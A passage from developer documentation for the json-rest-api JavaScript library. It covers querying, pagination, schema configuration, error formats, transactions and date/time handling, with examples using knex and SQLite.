  }
  
  // Complex boolean logic
  if (filters.featured_or_trending) {
    query.where(function() {
      this.where('is_featured', true)
          .orWhere('trending_score', '>', 0.8);
    });
  }
});
```

### Sorting

Control the order of results using the `sort` parameter.

#### Basic Sorting

```javascript
// Sort by single field (ascending)
const result = await api.resources.articles.query({
  queryParams: {
    sort: ['title']
  }
});

// Sort by single field (descending)
const result = await api.resources.articles.query({
  queryParams: {
    sort: ['-created_at']
  }
});

// HTTP equivalent
// GET /articles?sort=title
// GET /articles?sort=-created_at
```

#### Multi-field Sorting

```javascript
// Sort by multiple fields
const result = await api.resources.articles.query({
  queryParams: {
    sort: ['-featured', '-created_at', 'title']
  }
});

// HTTP equivalent (comma-separated)
// GET /articles?sort=-featured,-created_at,title
```

#### Sorting on Related Fields

```javascript
// Sort by related resource fields (if configured)
const result = await api.resources.articles.query({
  queryParams: {
    sort: ['author.name', '-category.priority']
  }
});
```

### Pagination

The library supports multiple pagination strategies:

#### Offset Pagination

```javascript
// Page-based pagination
const result = await api.resources.articles.query({
  queryParams: {
    page: {
      number: 2,
      size: 20
    }
  }
});

// Response includes:
// {
//   data: [...],
//   meta: {
//     page: {
//       total: 150,      // Total records (if enablePaginationCounts: true)
//       size: 20,        // Page size
//       number: 2,       // Current page
//       totalPages: 8    // Total pages (if counts enabled)
//     }
//   },
//   links: {
//     first: '/articles?page[number]=1&page[size]=20',
//     prev: '/articles?page[number]=1&page[size]=20',
//     self: '/articles?page[number]=2&page[size]=20',
//     next: '/articles?page[number]=3&page[size]=20',
//     last: '/articles?page[number]=8&page[size]=20'
//   }
// }

// HTTP equivalent
// GET /articles?page[number]=2&page[size]=20
```

#### Cursor Pagination

```javascript
// Forward pagination
const result = await api.resources.articles.query({
  queryParams: {
    page: {
      after: 'eyJpZCI6MTAwLCJjcmVhdGVkX2F0IjoiMjAyNC0wMS0xNSJ9',
      size: 10
    }
  }
});

// Backward pagination
const result = await api.resources.articles.query({
  queryParams: {
    page: {
      before: 'eyJpZCI6NTAsImNyZWF0ZWRfYXQiOiIyMDI0LTAxLTEwIn0=',
      size: 10
    }
  }
});

// Response includes:
// {
//   data: [...],
//   meta: {
//     page: {
//       hasMore: true,   // More records available
//       size: 10         // Page size
//     }
//   },
//   links: {
//     prev: '/articles?page[before]=...',
//     self: '/articles?page[after]=...',
//     next: '/articles?page[after]=...'
//   }
// }
```

#### Pagination Configuration

```javascript
// Configure in plugin
const restApiPlugin = new RestApiPlugin({
  queryDefaultLimit: 20,      // Default page size
  queryMaxLimit: 100,         // Maximum allowed page size
  enablePaginationCounts: true // Enable total counts (may impact performance)
});
```

### Sparse Fieldsets

Request only specific fields to reduce payload size:

```javascript
// Request specific fields for articles
const result = await api.resources.articles.query({
  queryParams: {
    fields: {
      articles: 'title,summary,published_at'
    }
  }
});

// With includes - specify fields for each type
const result = await api.resources.articles.query({
  queryParams: {
    include: ['author', 'category'],
    fields: {
      articles: 'title,summary',
      users: 'name,avatar',
      categories: 'name,slug'
    }
  }
});

// HTTP equivalent
// GET /articles?fields[articles]=title,summary&fields[users]=name,avatar
```

### Including Related Resources

Load related resources in a single request:

#### Basic Includes

```javascript
// Include single relationship
const result = await api.resources.articles.query({
  queryParams: {
    include: ['author']
  }
});

// Include multiple relationships
const result = await api.resources.articles.query({
  queryParams: {
    include: ['author', 'category', 'tags']
  }
});

// HTTP equivalent
// GET /articles?include=author,category,tags
```

#### Nested Includes

```javascript
// Include nested relationships
const result = await api.resources.articles.query({
  queryParams: {
    include: ['author.profile', 'comments.user', 'category.parent']
  }
});

// Deep nesting (limited by includeDepthLimit)
const result = await api.resources.articles.query({
  queryParams: {
    include: ['comments.user.profile.avatar']
  }
});

// HTTP equivalent
// GET /articles?include=comments.user.profile.avatar
```

#### Include with Filtering

Some implementations support filtering included resources:

```javascript
// Custom hook to filter included resources
api.resource('articles').hook('afterDataQuery', async (context) => {
  if (context.result.included) {
    // Filter included comments to only show approved
    context.result.included = context.result.included.filter(resource => {
      if (resource.type === 'comments') {
        return resource.attributes.status === 'approved';
      }
      return true;
    });
  }
});
```

---

## Configuration Options

### Plugin Configuration

```javascript
const restApiPlugin = new RestApiPlugin({
  // API behavior
  simplifiedApi: true,              // Use simplified mode for programmatic calls (default: true)
  simplifiedTransport: false,       // Use JSON:API for HTTP transport (default: false)
  
  // Return record configuration
  returnRecordApi: {
    post: 'full',                   // Return full record after create (default)
    put: 'full',                    // Return full record after replace (default)
    patch: 'full',                  // Return full record after update (default)
    delete: 'no'                    // Return nothing after delete (default)
  },
  
  returnRecordTransport: {
    post: 'no',                     // Return 204 for HTTP POST (default)
    put: 'no',                      // Return 204 for HTTP PUT (default)
    patch: 'no',                    // Return 204 for HTTP PATCH (default)
    delete: 'no'                    // Return 204 for HTTP DELETE (default)
  },
  
  // Query limits
  queryDefaultLimit: 20,            // Default pagination size
  queryMaxLimit: 100,               // Maximum allowed page size
  
  // Include depth
  includeDepthLimit: 3,             // Maximum relationship nesting depth
  
  // Performance
  enablePaginationCounts: true,     // Execute count queries for total pages
  
  // Error handling
  exposeErrors: false,              // Include error details in responses
  
  // Custom serializers
  serializers: {
    articles: customArticleSerializer
  }
});
```

---

## Schema Configuration

### Resource Schema Structure

```javascript
api.addResource({
  name: 'articles',
  
  // Primary key configuration
  idProperty: 'id',                 // Custom primary key field (default: 'id')
  
  schema: {
    // Attributes
    attributes: {
      title: {
        type: 'string',
        required: true,
        maxLength: 200
      },
      content: {
        type: 'string',
        required: true
      },
      status: {
        type: 'string',
        enum: ['draft', 'published', 'archived'],
        default: 'draft'
      },
      published_at: {
        type: 'datetime',
        nullable: true
      },
      metadata: {
        type: 'object',
        // Custom getter/setter for data transformation
        getter: (value) => JSON.parse(value || '{}'),
        setter: (value) => JSON.stringify(value)
      },
      price: {
        type: 'number',
        // Store as cents, display as dollars
        getter: (value) => value / 100,
        setter: (value) => Math.round(value * 100)
      }
    },
    
    // Virtual fields (excluded from database operations)
    virtualFields: ['temp_data', 'ui_state'],
    
    // Relationships
    relationships: {
      author: {
        type: 'users',
        required: true,
        relationshipType: 'belongsTo',
        foreignKey: 'author_id'        // Explicit foreign key
      },
      category: {
        type: 'categories',
        relationshipType: 'belongsTo',
        nullable: true
      },
      tags: {
        type: 'tags',
        relationshipType: 'manyToMany',
        through: 'article_tags',       // Junction table
        pivotFields: ['sort_order']    // Additional pivot fields
      },
      comments: {
        type: 'comments',
        relationshipType: 'hasMany',
        foreignKey: 'article_id'
      },
      // Polymorphic relationship
      commentable: {
        polymorphic: true,
        types: ['articles', 'videos', 'photos'],
        typeField: 'commentable_type',
        idField: 'commentable_id'
      }
    },
    
    // Computed fields
    computedFields: {
      word_count: {
        type: 'number',
        compute: (record) => record.content.split(/\s+/).length,
        dependencies: ['content']      // Recompute when content changes
      },
      reading_time: {
        type: 'number',
        compute: (record) => Math.ceil(record.word_count / 200),
        dependencies: ['word_count']
      },
      full_name: {
        type: 'string',
        compute: (record) => `${record.first_name} ${record.last_name}`,
        dependencies: ['first_name', 'last_name']
      }
    },
    
    // Hidden fields (never exposed in API)
    hiddenFields: ['internal_notes', 'admin_flags'],
    
    // Search configuration
    searchSchema: {
      title: {
        type: 'string',
        operators: ['eq', 'like', 'ilike']
      },
      status: {
        type: 'string',
        operators: ['eq', 'in']
      },
      published_at: {
        type: 'datetime',
        operators: ['gt', 'gte', 'lt', 'lte']
      },
      author_id: {
        type: 'number',
        operators: ['eq', 'in']
      },
      view_count: {
        type: 'number',
        operators: ['eq', 'gt', 'gte', 'lt', 'lte', 'between']
      }
    },
    
    // Permissions
    permissions: {
      create: ['author', 'admin'],
      read: ['*'],
      update: ['author', 'editor', 'admin'],
      delete: ['admin']
    },
    
    // Soft delete configuration
    softDelete: {
      field: 'deleted_at',
      includeDeleted: false
    },
    
    // Custom validation
    validate: async (data, method, context) => {
      if (data.status === 'published' && !data.published_at) {
        throw new Error('Published articles must have published_at date');
      }
      
      if (method === 'post' && data.title.length < 10) {
        throw new Error('Title must be at least 10 characters');
      }
    }
  }
});
```

### Important Schema Features

#### ID Property Configuration
```javascript
// Custom primary key
api.addResource({
  name: 'users',
  idProperty: 'user_id',  // Use 'user_id' instead of 'id'
  schema: {
    attributes: {
      user_id: { type: 'number', required: true },
      email: { type: 'string', required: true }
    }
  }
});
```

#### Virtual Fields
Virtual fields are excluded from database operations but can be used for temporary UI state:

```javascript
virtualFields: ['expanded', 'selected', 'temp_calculation']

// These fields are ignored during database operations
const result = await api.resources.articles.post({
  inputRecord: {
    title: 'New Article',
    expanded: true,  // Ignored in database
    selected: false  // Ignored in database
  }
});
```

#### Field Transformations
Use getters and setters for automatic data transformation:

```javascript
attributes: {
  // JSON storage
  settings: {
    type: 'object',
    getter: (value) => JSON.parse(value || '{}'),
    setter: (value) => JSON.stringify(value)
  },
  
  // Encryption
  ssn: {
    type: 'string',
    getter: (value) => decrypt(value),
    setter: (value) => encrypt(value)
  },
  
  // Unit conversion
  temperature_c: {
    type: 'number',
    getter: (value) => value,  // Store as Celsius
    setter: (value) => value
  },
  temperature_f: {
    type: 'number',
    virtual: true,
    getter: (record) => (record.temperature_c * 9/5) + 32,
    setter: (value, record) => {
      record.temperature_c = (value - 32) * 5/9;
    }
  }
}
```

---

## Error Handling

The library uses standard JSON:API error format:

### Error Response Format

```javascript
{
  errors: [
    {
      status: '422',
      code: 'VALIDATION_ERROR',
      title: 'Validation Failed',
      detail: 'The title field is required.',
      source: {
        pointer: '/data/attributes/title'
      },
      meta: {
        field: 'title',
        rule: 'required'
      }
    }
  ]
}
```

### Common Error Types

#### Validation Errors (422)
```javascript
{
  errors: [{
    status: '422',
    code: 'VALIDATION_ERROR',
    title: 'Validation Failed',
    detail: 'The email field must be a valid email address.',
    source: { pointer: '/data/attributes/email' }
  }]
}
```

#### Not Found Errors (404)
```javascript
{
  errors: [{
    status: '404',
    code: 'RESOURCE_NOT_FOUND',
    title: 'Resource Not Found',
    detail: 'Article with id 999 not found.'
  }]
}
```

#### Permission Errors (403)
```javascript
{
  errors: [{
    status: '403',
    code: 'FORBIDDEN',
    title: 'Forbidden',
    detail: 'You do not have permission to update this article.'
  }]
}
```

#### Relationship Errors (400)
```javascript
{
  errors: [{
    status: '400',
    code: 'INVALID_RELATIONSHIP',
    title: 'Invalid Relationship',
    detail: 'Cannot set author to user 999: user does not exist.',
    source: { pointer: '/data/relationships/author' }
  }]
}
```

### Custom Error Handling

```javascript
// In hooks
api.resource('articles').hook('beforeDataPost', async (context) => {
  if (context.inputData.attributes.title.length < 10) {
    const error = new Error('Title too short');
    error.status = 422;
    error.code = 'TITLE_TOO_SHORT';
    error.pointer = '/data/attributes/title';
    throw error;
  }
});

// Custom error transformation
api.hook('errorTransform', async (error, context) => {
  return {
    status: error.status || '500',
    code: error.code || 'INTERNAL_ERROR',
    title: error.title || 'Error',
    detail: error.message,
    meta: {
      timestamp: new Date().toISOString(),
      request_id: context.requestId
    }
  };
});
```

---

## Advanced Features

### Transaction Support

All methods support database transactions with automatic management:

```javascript
// Automatic transaction (recommended)
const result = await api.resources.articles.post({
  inputRecord: {
    title: 'New Article',
    content: 'Content...'
  }
  // No transaction provided - library creates and auto-commits
});

// Manual transaction management
const trx = await knex.transaction();
try {
  // Create article
  const article = await api.resources.articles.post({
    inputRecord: {
      title: 'New Article',
      content: 'Content...'
    },
    transaction: trx  // Provide transaction
  });
  
  // Create related comments
  for (const commentData of comments) {
    await api.resources.comments.post({
      inputRecord: {
        content: commentData.content,
        article_id: article.id
      },
      transaction: trx  // Same transaction
    });
  }
  
  await trx.commit();  // Manual commit required
} catch (error) {
  await trx.rollback();
  throw error;
}
```

**Important:** When you provide a transaction, you're responsible for committing/rolling back. When you don't provide one, the library auto-commits.

### Batch Operations

Process multiple operations efficiently:

```javascript
// Batch create with transaction
const createArticles = async (articlesData) => {
  const trx = await knex.transaction();
  const results = [];
  
  try {
    for (const data of articlesData) {
      const result = await api.resources.articles.post({
        inputRecord: data,
        transaction: trx,
        returnFullRecord: 'minimal' // Optimize for batch
      });
      results.push(result);
    }
    
    await trx.commit();
    return results;
  } catch (error) {
    await trx.rollback();
    throw error;
  }
};

// Batch update
const updateArticles = async (updates) => {
  const trx = await knex.transaction();
  
  try {
    for (const { id, data } of updates) {
      await api.resources.articles.patch({
        inputRecord: { id, ...data },
        transaction: trx,
        returnFullRecord: 'no'  // Skip return for performance
      });
    }
    
    await trx.commit();
  } catch (error) {
    await trx.rollback();
    throw error;
  }
};
```

### Computed Fields

Add dynamic fields calculated at runtime:

```javascript
// In resource schema
computedFields: {
  full_name: {
    type: 'string',
    compute: (record) => `${record.first_name} ${record.last_name}`,
    dependencies: ['first_name', 'last_name']
  },
  age: {
    type: 'number',
    compute: (record) => {
      const birthDate = new Date(record.birth_date);
      const today = new Date();
      return today.getFullYear() - birthDate.getFullYear();
    },
    dependencies: ['birth_date']
  },
  // Async computed field
  stats: {
    type: 'object',
    compute: async (record, context) => {
      return await statsService.getArticleStats(record.id);
    },
    dependencies: []
  }
}

// Request computed fields
const result = await api.resources.users.get({
  id: '1',
  queryParams: {
    fields: {
      users: 'first_name,last_name,full_name,age'
    }
  }
});
```

### Polymorphic Relationships

Support relationships to multiple resource types:

```javascript
// Schema configuration
relationships: {
  commentable: {
    polymorphic: true,
    types: ['articles', 'videos', 'photos'],
    typeField: 'commentable_type',
    idField: 'commentable_id'
  }
}

// Usage
const result = await api.resources.comments.post({
  inputRecord: {
    content: 'Great article!',
    commentable_type: 'articles',
    commentable_id: '1'
  }
});

// Query polymorphic relationships
const result = await api.resources.comments.query({
  queryParams: {
    include: ['commentable'],  // Includes the related article/video/photo
    filters: {
      commentable_type: 'articles'
    }
  }
});
```

### Soft Deletes

Implement soft deletion pattern:

```javascript
// Configure in schema
softDelete: {
  field: 'deleted_at',
  includeDeleted: false  // Default behavior
}

// Hook implementation
api.resource('articles').hook('beforeDataDelete', async (context) => {
  // Convert delete to update
  context.method = 'patch';
  context.inputData = {
    attributes: {
      deleted_at: new Date().toISOString()
    }
  };
});

// Query including soft-deleted
const result = await api.resources.articles.query({
  queryParams: {
    filters: {
      include_deleted: true
    }
  }
});

// Restore soft-deleted record
const result = await api.resources.articles.patch({
  inputRecord: {
    id: '1',
    deleted_at: null
  }
});
```

### Field-Level Permissions

Control access to specific fields:

```javascript
// In enrichAttributes hook
api.resource('users').hook('enrichAttributes', async (context) => {
  // Hide sensitive fields for non-admin users
  if (!context.auth.isAdmin) {
    delete context.attributes.email;
    delete context.attributes.phone;
    delete context.attributes.internal_notes;
  }
  
  // Show computed permission fields
  if (context.requestedComputedFields.includes('can_edit')) {
    context.attributes.can_edit = 
      context.auth.userId === context.record.id || 
      context.auth.isAdmin;
  }
});

// In beforeSchemaValidate hook - prevent updates
api.resource('users').hook('beforeSchemaValidatePatch', async (context) => {
  // Prevent non-admins from updating certain fields
  if (!context.auth.isAdmin) {
    const restrictedFields = ['role', 'permissions', 'verified'];
    for (const field of restrictedFields) {
      if (field in context.inputData.attributes) {
        throw new Error(`Cannot update field: ${field}`);
      }
    }
  }
});
```

### Cross-Table Search

The library supports searching across related tables:

```javascript
// Using knexQueryFiltering hook
api.resource('articles').hook('knexQueryFiltering', async (context) => {
  const { query, filters } = context;
  
  // Search across multiple tables
  if (filters.global_search) {
    query.leftJoin('users', 'articles.author_id', 'users.id')
         .leftJoin('categories', 'articles.category_id', 'categories.id')
         .where(function() {
           this.where('articles.title', 'like', `%${filters.global_search}%`)
               .orWhere('articles.content', 'like', `%${filters.global_search}%`)
               .orWhere('users.name', 'like', `%${filters.global_search}%`)
               .orWhere('categories.name', 'like', `%${filters.global_search}%`);
         });
  }
});
```

### Database-Specific Features

The library detects database capabilities and adjusts behavior:

```javascript
// Window functions (PostgreSQL, MySQL 8+, SQLite 3.25+)
api.resource('articles').hook('afterDataQuery', async (context) => {
  // Add ranking if database supports window functions
  if (context.db.supportsWindowFunctions) {
    // Ranking logic using ROW_NUMBER(), RANK(), etc.
  }
});

// JSON operations (PostgreSQL, MySQL 5.7+)
api.resource('articles').hook('knexQueryFiltering', async (context) => {
  const { query, filters } = context;
  
  if (filters.metadata_key && context.db.supportsJsonb) {
    // PostgreSQL JSONB query
    query.whereRaw("metadata->>'key' = ?", [filters.metadata_key]);
  }
});
```# Appendices: Date and Time Handling

## Overview

This document explains how the JSON REST API handles date and time values throughout the system, from database storage to API responses. Understanding this behavior is crucial for developers working with temporal data.

## Supported Date/Time Types

The API supports three temporal data types in schemas:

### 1. `date`
- **Format**: `YYYY-MM-DD`
- **Example**: `2024-01-15`
- **Usage**: Birth dates, due dates, or any date without time component
- **Database Storage**: DATE column type
- **JSON Output**: ISO 8601 date string

### 2. `dateTime`
- **Format**: `YYYY-MM-DD HH:MM:SS` (input) / ISO 8601 (output)
- **Example Input**: `2024-01-15 14:30:00`
- **Example Output**: `2024-01-15T14:30:00.000Z`
- **Usage**: Timestamps, created/updated times, or any date with time
- **Database Storage**: DATETIME (MySQL) or TIMESTAMP (PostgreSQL)
- **JSON Output**: Full ISO 8601 datetime string with timezone

### 3. `time`
- **Format**: `HH:MM:SS`
- **Example**: `14:30:00`
- **Usage**: Time of day without date context (e.g., business hours)
- **Database Storage**: TIME column type
- **JSON Output**: ISO 8601 time string

## Schema Definition

Define date/time fields in your schema like this:

```javascript
const articleSchema = {
  publishedDate: { type: 'date', required: true },
  createdAt: { type: 'dateTime', defaultTo: 'now()' },
  updatedAt: { type: 'dateTime', defaultTo: 'now()' },
  dailyPostTime: { type: 'time', nullable: true }
};
```

## Input Validation

### On Write Operations (POST/PUT/PATCH)

The API validates and normalizes date/time inputs:

```javascript
// POST /api/articles
{
  "data": {
    "type": "articles",
    "attributes": {
      "publishedDate": "2024-01-15",           // Valid date
      "createdAt": "2024-01-15T14:30:00Z",     // Valid dateTime (ISO 8601)
      "dailyPostTime": "14:30:00"              // Valid time
    }
  }
}
```

**Accepted Input Formats:**
- **date**: 
  - `YYYY-MM-DD` (parsed at UTC midnight)
  - ISO 8601 date strings
  - Any JavaScript Date parseable string
- **dateTime**: 
  - ISO 8601 strings (`2024-01-15T14:30:00Z`) - recommended
  - `YYYY-MM-DD HH:MM:SS` (assumed UTC)
  - JavaScript Date parseable strings
  - Unix timestamps (as numbers)
- **time**: 
  - `HH:MM:SS` or `HH:MM`
  - Extracted from datetime strings

**Storage Format:**
All date/time values are converted to JavaScript Date objects before storage, allowing the database driver to handle the appropriate formatting for each database system.

## Output Normalization

### Database to API Response

All date/time values are normalized when returned from the API:

```javascript
// GET /api/articles/123
{
  "data": {
    "type": "articles",
    "id": "123",
    "attributes": {
      "publishedDate": "2024-01-15",                    // date type
      "createdAt": "2024-01-15T14:30:00.000Z",         // dateTime type
      "updatedAt": "2024-01-15T16:45:30.000Z",         // dateTime type
      "dailyPostTime": "14:30:00"                      // time type
    }
  }
}
```

### Key Normalization Behaviors:

1. **Boolean Normalization**: Database values of `1`/`0` are converted to `true`/`false`
2. **Date Objects**: All date/time values are returned as JavaScript Date objects internally, then serialized to ISO 8601 strings in JSON responses
3. **UTC Assumption**: MySQL DATETIME values (which lack timezone info) are assumed to be UTC

## Database-Specific Handling

### MySQL
- **Issue**: DATE and DATETIME types don't store timezone information
- **Solution**: The API assumes all MySQL dates are stored in UTC
- **Example**: `2024-01-15 14:30:00` in database → `2024-01-15T14:30:00.000Z` in API

### PostgreSQL
- **Recommended**: Use `TIMESTAMPTZ` (timestamp with timezone) for dateTime fields
- **Behavior**: PostgreSQL handles timezone conversion automatically
- **Storage**: Always stores in UTC, converts based on session timezone

## Best Practices

### 1. Always Store in UTC
```javascript
// Good: Store timestamps in UTC
const article = {
  createdAt: new Date().toISOString() // "2024-01-15T14:30:00.000Z"
};

// Bad: Store in local timezone
const article = {
  createdAt: new Date().toString() // "Mon Jan 15 2024 09:30:00 GMT-0500 (EST)"
};
```

### 2. Use Appropriate Types
- Use `date` for dates without time significance
- Use `dateTime` for timestamps and audit fields
- Use `time` for recurring daily events

### 3. Timezone Handling
- Send all dateTime values to the API in UTC
- The API always returns dateTime values in UTC (with 'Z' suffix)
- Handle timezone conversion in your client application

### 4. Filtering and Querying
When filtering by dates, use ISO 8601 format:

```javascript
// Filter articles published after a date
GET /api/articles?filters[publishedDate][$gte]=2024-01-01

// Filter by datetime range
GET /api/articles?filters[createdAt][$gte]=2024-01-01T00:00:00Z&filters[createdAt][$lt]=2024-02-01T00:00:00Z
```

## Migration Considerations

### From Existing Systems

If migrating from a system that stores dates differently:

1. **Local Time Storage**: Convert all dates to UTC before importing
2. **String Storage**: Ensure strings match expected formats
3. **Numeric Timestamps**: Use `timestamp` type for Unix timestamps

### Database Configuration

For optimal date handling, configure your database connection:

**MySQL** (in Knex config):
```javascript
{
  client: 'mysql2',
  connection: {
    // ... other config
    timezone: 'UTC'
  }
}
```

**PostgreSQL** (in Knex config):
```javascript
{
  client: 'pg',
  connection: {
    // ... other config
  }
  // PostgreSQL handles timezones well by default
}
```

## Common Issues and Solutions

### Issue 1: Dates Shifting by Timezone Offset
**Symptom**: A date like `2024-01-15` becomes `2024-01-14` or `2024-01-16`  
**Cause**: Timezone conversion during parsing  
**Solution**: The API handles this by parsing date-only values at UTC midnight

### Issue 2: MySQL Dates Appear Wrong
**Symptom**: Stored `14:30:00` appears as `19:30:00` or `09:30:00`  
**Cause**: MySQL DATETIME interpreted in local timezone  
**Solution**: The API assumes MySQL dates are UTC and adds 'Z' suffix

### Issue 3: Time Values Need Date Context
**Symptom**: Can't perform date arithmetic on time-only values  
**Cause**: Time values lack date context  
**Solution**: The API attaches times to epoch date (1970-01-01) in UTC

## Technical Implementation Details

The date/time handling is implemented in two key areas:

1. **Input Validation** (`json-rest-schema`):
   - Validates format on write operations
   - Converts all date inputs to JavaScript Date objects
   - Ensures date-only values parse at UTC midnight
   - Returns Date objects for storage (Knex handles DB-specific formatting)

2. **Output Normalization** (`database-value-normalizers.js`):
   - Handles database-specific quirks (MySQL timezone issues)
   - Ensures Date objects are properly created from database values
   - Fixes MySQL datetime strings by assuming UTC
   - Maintains consistency across different database engines

This two-stage approach ensures data integrity on input and consistent formatting on output, regardless of the underlying database system. The key insight is that JavaScript Date objects are used as the common format throughout the pipeline, with database drivers handling the conversion to/from their native formats.# Basic usage and basic configuration

This section explains how to set up `json-rest-api` in your code.

## Defining the Basic Tables

The documentation uses a consistent example throughout - a book catalog system with authors, publishers, and countries.

**Important**: The five tables defined below (countries, publishers, authors, books, and book_authors) form the foundation for all examples, tests, and documentation in this guide. We'll consistently reference this same schema structure to demonstrate all features of the library. At times, we will change the definition of some of them to show specific features.

Also for brevity, the `inspect()` function will be assumed to be set.

Also, since we are using them, you will need to install:

```bash
npm install json-rest-api
npm install knex
npm install better-sqlite3
```

You won't need to install `hooned-api` since it's already a dependency of json-rest-api.

So this is the first basic script:

```javascript
import { RestApiPlugin, RestApiKnexPlugin } from 'json-rest-api';
import { Api } from 'hooked-api';
import knexLib from 'knex';
import util from 'util';

// Utility used throughout this guide
const inspect = (obj) => util.inspect(obj, { depth: 5 })

// Create a Knex instance connected to SQLite in-memory database
const knex = knexLib({
  client: 'better-sqlite3',
  connection: {
    filename: ':memory:'
  },
  useNullAsDefault: true
});

// Create API instance
const api = new Api({ name: 'book-catalog-api'});

// Install plugins
await api.use(RestApiPlugin); // URLs auto-detected
await api.use(RestApiKnexPlugin, { knex });

// Define schemas for our book catalog system

// Countries table
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    code: { type: 'string', max: 2, unique: true, search: true }, // ISO country code
  },
  relationships: {
    publishers: { hasMany: 'publishers', foreignKey: 'country_id' },
    books: { hasMany: 'books', foreignKey: 'country_id' }
  },
});
await api.resources.countries.createKnexTable()


/// *** ...programmatic calls here... ***

// Close the database connection (since there is no server waiting)
await knex.destroy();
console.log('\nAll schemas created successfully!');
console.log('Database connection closed.');
```

This set of resources cover a lot of ground in terms of relationships etc. Those other tables will be covered in the next part of this guide.

#### Loglevels

The available log levels in hooked-api are (from most verbose to least verbose):

  1. `trace` - Most verbose, shows everything including internal operations
  2. `debug` - Debug information for development
  3. `info` - Informational messages (DEFAULT)
  4. `warn` - Only warnings and errors
  5. `error` - Only error messages
  6. `silent` - No logging at all

To change loglevels, pass a logLevel option to the API:

```javascript
const api = new Api({ 
  name: 'book-catalog-api', 
  logLevel: 'warn'  // Only show warnings and errors
});
```

By default, the INFO level logs you're seeing are the default. To reduce them, you could use:

- logLevel: `warn` - Only see warnings and errors
- logLevel: `error` - Only see errors
- logLevel: `silent` - No logs at all

To see more detail for debugging:

- logLevel: `debug` - More detailed information
- logLevel: `trace` - Everything, including hook executions and internal operations

### Database Options

The `json-rest-knex-plugin` plugin uses `knex` as its database abstraction layer, which supports a wide variety of SQL databases.
In the example above, we configured `knex` to use an in-memory SQLite database for simplicity:

```javascript
const knex = knexLib({
  client: 'sqlite3',
  connection: {
    filename: ':memory:' // In-memory database for quick examples
  },
  useNullAsDefault: true // Recommended for SQLite
});
```

To connect to a different database, you would simply change the `client` and `connection` properties in the `knexLib` configuration. Here are a few common examples:

**PostgreSQL:**

```javascript
const knex = knexLib({
  client: 'pg', // PostgreSQL client
  connection: {
    host: '127.0.0.1',
    user: 'your_username',
    password: 'your_password',
    database: 'your_database_name',
    port: 5432 // Default PostgreSQL port
  }
});
```
**MySQL / MariaDB:**

```javascript
const knex = knexLib({
  client: 'mysql', // or 'mariasql' for MariaDB
  connection: {
    host: '127.0.0.1',
    user: 'your_username',
    password: 'your_password',
    database: 'your_database_name',
    port: 3306 // Default MySQL/MariaDB port
  }
});
```

Remember to install the corresponding `knex` driver for your chosen database (e.g., `npm install pg` for PostgreSQL, `npm install mysql2` for MySQL) just as we had to `npm install` the `better-sqlite3` package to make the first example work. 

### Programmatic Usage

The `json-rest-api` plugin extends your `hooked-api` instance with powerful RESTful capabilities, allowing you to interact with your defined resources both programmatically within your application code and via standard HTTP requests.

The instanced object becomes a fully-fledged, database and schema aware API.

Once your resources are defined using `api.addResource()`, you can directly call CRUD (Create, Read, Update, Delete) methods on `api.resources.<resourceName>`.

Let's start by creating a `country` record:

```javascript
// Example: Create a country
const countryUs = await api.resources.countries.post({
  name: 'United States',
  code: 'US'
});
console.log('Created Country:', inspect(countryUs));
// Expected Output:
// Created Country: { id: '1', name: 'United States', code: 'US' }
```

Now, let's retrieve this country data using its ID:

```javascript
// Example: Refetch a country by ID
const countryUsRefetched = await api.resources.countries.get({
  id: countryUs.id, // Use the ID returned from the POST operation
});
console.log('Refetched Country:', inspect(countryUsRefetched));
// Expected Output:
// Refetched Country: { id: '1', name: 'United States', code: 'US' }
```

The database is populated, and the newly added record is then fetched.

#### API usage and simplified mode

In the examples above, we're using the API in **simplified mode** (which is the default for programmatic usage). Simplified mode is a convenience feature that allows you to work with plain JavaScript objects instead of the full JSON:API document structure. However, it's important to understand that internally, everything is still processed as proper JSON:API documents.

Simplified mode changes:

- **Input**: You can pass plain objects with just the attributes
- **Output**: You get back plain objects with id and attributes merged at the top level

Here's how the same operations look when **NOT** using simplified mode:

```javascript
// Create a country (non-simplified mode)
const countryUs = await api.resources.countries.post({
  inputRecord: {
    data: {
      type: 'countries',
      attributes: {
        name: 'United States',
        code: 'US'
      }
    }
  },
  simplified: false
});
console.log('Created Country:', inspect(countryUs));
// Expected Output:
// Created Country: {
//   data: {
//     type: 'countries',
//     id: '1',
//     attributes: { name: 'United States', code: 'US' },
//     links: { self: '/api/countries/1' }
//   },
//   links: { self: '/api/countries/1' }
// }

// Fetch a country by ID (non-simplified mode)
const countryUsRefetched = await api.resources.countries.get({
  id: countryUs.data.id,
  simplified: false
});
console.log('Refetched Country:', inspect(countryUsRefetched));
// Expected Output (a  full JSON:API record):
// Refetched Country: {
//   data: {
//     type: 'countries',
//     id: '1',
//     attributes: { name: 'United States', code: 'US' },
//     links: { self: '/api/countries/1' }
//   },
//   links: { self: '/api/countries/1' }
// }
```

(Note that the full JSON:API record includes links to resources, which are auto-detected from request headers.)

As you can see, when `simplified: false` is used:

- Input requires the full JSON:API document structure with `data`, `type`, and `attributes`
- Output returns the full JSON:API response with the same nested structure (and links)
- You need to access the ID as `result.data.id` instead of just `result.id`

**NOTE**: For programmatic API calls, simplified mode defaults to true but can be configured at multiple levels: globally via `simplifiedApi: true/false` when installing RestApiPlugin, per-resource when calling `addResource()`, or per-call by setting `simplified: true/false` in the call parameters, with the hierarchy being per-call → per-resource → global default; additionally, when passing attributes directly (without inputRecord), simplified mode is always true regardless of configuration.

For example:

1. **Global default**: Set during plugin installation
   ```javascript
   await api.use(RestApiPlugin, {
     simplifiedApi: false,      // All API calls will use JSON:API format by default
     simplifiedTransport: true  // All HTTP calls will use simplified format by default
   });
   ```

2. **Per-resource override**: Set when defining a resource
   ```javascript
   await api.addResource('countries', {
     schema: {
       name: { type: 'string', required: true },
       code: { type: 'string', required: true }
     },
     simplifiedApi: false,      // API calls to this resource use JSON:API format
     simplifiedTransport: true  // HTTP calls to this resource use simplified format
   });
   ```

NOTE: this can also be written as:

   ```javascript
   await api.addResource('countries', {
     schema: {
       name: { type: 'string', required: true },
       code: { type: 'string', required: true }
     },
    
    },{
      // Parameters set directly into 'vars'
      vars: {
        simplifiedApi: false,      // API calls to this resource use JSON:API format
        simplifiedTransport: true  // HTTP calls to this resource use simplified format
      }
    }
   );
   ```


3. **Per-call override**: Set in individual method calls
   ```javascript
   // Force non-simplified for this call only
  const result = await api.resources.countries.post({
    inputRecord: {
      data: {
        type: 'countries',
        attributes: {
          name: 'United States',
          code: 'US'
        }
      }
    },
    simplified: false
  });

   ```

The hierarchy is: **per-call → per-resource (parameters or variables) → global default**

